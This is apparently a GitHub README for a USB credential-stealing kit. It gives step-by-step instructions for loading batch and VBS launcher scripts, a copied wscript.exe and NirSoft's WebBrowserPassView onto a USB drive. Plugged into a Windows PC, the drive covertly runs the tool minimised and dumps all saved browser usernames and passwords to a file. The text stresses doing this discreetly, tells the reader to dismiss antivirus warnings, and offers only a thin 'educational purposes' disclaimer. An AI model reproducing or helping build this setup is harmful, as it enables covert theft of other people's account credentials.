This little program allows you to discretely obtain Usernames and Passwords from a Windows PC and automatically copies them to your USB drive.

Instructions:

Download files from Github and place them into your USB Drive.
Go to your Windows/system32 folder and copy the following file to your USB Drive: wscript.exe
Go to https://www.nirsoft.net/utils/web_browser_password.html to download WebPassView.exe and copy the file to your USB Drive. I have added a copy in this repo as well... (NOTE: Windows might see this file as a virus (it is a false positive, and not a virus)

So by now you should have 5 files on your USB drive. It should look like this...
https://imgur.com/DKkhg4S
Safely unplug your USB drive, and test it on your machine.

Plug it in, if it does not automatically run, click on launch.bat

Refresh your USB drive, and you'll have a new file called WebBrowserPassView.txt, which contains all of your usernames and passwords.


Launch.bat = launches invisible.vbs and passview.bat

invisible.vbs = minimizes WebBrowserPassView.exe

passview.bat = starts WebBrowserPassView.exe and saves all usernames and passwords to WebBrowserPassView.txt

This was created for educational purposes.
